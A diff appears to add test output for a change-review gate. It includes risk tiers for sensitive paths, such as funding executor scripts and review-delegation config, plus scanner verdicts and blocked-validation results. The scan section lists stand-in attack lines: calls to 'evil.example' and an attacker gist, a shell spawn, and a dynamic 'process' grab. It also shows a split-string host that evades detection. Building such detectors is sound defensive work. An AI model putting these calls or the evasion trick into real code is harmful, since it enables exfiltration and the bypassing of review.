@@ -1,0 +1,47 @@
+--- classify
+ltzzz-memory/魄.md                                              L3
+knowledge/results/dispatch/oversight/latest.json               L3
+ops/派单台账.md                                                    L3
+knowledge/results/rentahuman/stage2a-copilot-20261022.json     L3
+scripts/funded-invest-executor.mjs                             L3
+scripts/provision-funding-executor.mjs                         L3
+scripts/prepare-treasury-migration.mjs                         L3
+scripts/lib/proxy-auth.mjs                                     L3
+scripts/package.json                                           L3
+docs/x.md                                                      L0
+config/review-delegation.json                                  L3
+--- scan
+const ws=new WebSocket('wss://evil.example/x')               => unapproved_external_host
+const g=Function('return process')()                         => new_dynamic_execution_requires_review
+import {spawn} from 'x'; spawn('sh',['-c','id'])             => new_dynamic_execution_requires_review
+fetch('//evil.example')                                      => unapproved_external_host
+const h='ev'+'il.example';fetch('https://'+h)                => (none)
+see task-queue-runner-config-notes for details               => (none)
+risk-adjusted-return-calculation-method                      => (none)
+fetch('https://gist.github.com/attacker/abc')                => unapproved_external_host
+--- same executor, two providers
+{
+  risk: 'L3',
+  passed: false,
+  status: 'validation_blocked',
+  reasons: [
+    'one_authenticated_author_required',
+    'executor_provider_registry_invalid',
+    'trusted_base_checks_required',
+    'distinct_provider_reviews_required',
+    'owner_notification_evidence_required'
+  ]
+}
+--- self-signed deployment verification
+{
+  risk: 'L2',
+  passed: false,
+  deployment: undefined,
+  reasons: [
+    'one_authenticated_author_required',
+    'executor_provider_registry_invalid',
+    'trusted_base_checks_required',
+    'distinct_provider_reviews_required',
+    'signed_allowlisted_canary_verification_required'
+  ]
+}
